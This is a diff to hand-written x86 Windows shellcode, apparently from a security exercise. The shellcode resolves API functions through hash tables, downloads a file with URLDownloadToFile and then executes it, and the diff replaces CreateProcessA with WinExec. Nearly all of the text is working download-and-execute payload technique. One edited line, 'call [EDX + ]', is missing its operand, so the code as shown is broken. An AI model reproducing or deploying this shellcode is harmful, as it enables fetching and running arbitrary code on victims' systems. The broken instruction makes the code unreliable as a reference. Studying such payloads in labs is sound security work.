@@ -97,19 +97,26 @@ push 0x00 ; push pcaller
 call [EDX + URLDOWNLOADTOFILE]
 mov edx, ebx ; Moved back to be consistent
 
-; CreatProcess
+; Winexec to open mspaint of the flower image
 lea esi, [EDX + EXE]
-push esp
-push esp
-push 0x00
-push 0x00
-push 0x00
-push 0x00
-push 0x00
 push 0x00
 push esi
-push 0x00
-call [edx + CreateProcessA]
+call [EDX + ]
+
+; CreatProcess This failed to be 
+; found by the hash
+; lea esi, [EDX + EXE]
+; push esp
+; push esp
+; push 0x00
+; push 0x00
+; push 0x00
+; push 0x00
+; push 0x00
+; push 0x00
+; push esi
+; push 0x00
+; call [edx + CreateProcessA]
 
 
 
@@ -220,7 +227,7 @@ ret
 KERNEL32HASHTABLE:
 	dd 0x95902b19 ; ExitProcess
 	dd 0xc8ac8026 ; LoadLibraryA
-	dd 0x46318ac7 ; CreateProcess
+	dd 0xe8bf6dad  ; WinExec
 	dd 0xFFFF ; make sure to end with this token
 
 KERNEL32FUNCTIONSTABLE:
@@ -228,7 +235,7 @@ ExitProcess:
 	dd 0x00000000
 LoadLibraryA:
 	dd 0x00000001
-CreateProcessA:
+WinExec:
 	dd 0x00000002
 
 USER32HASHTABLE:
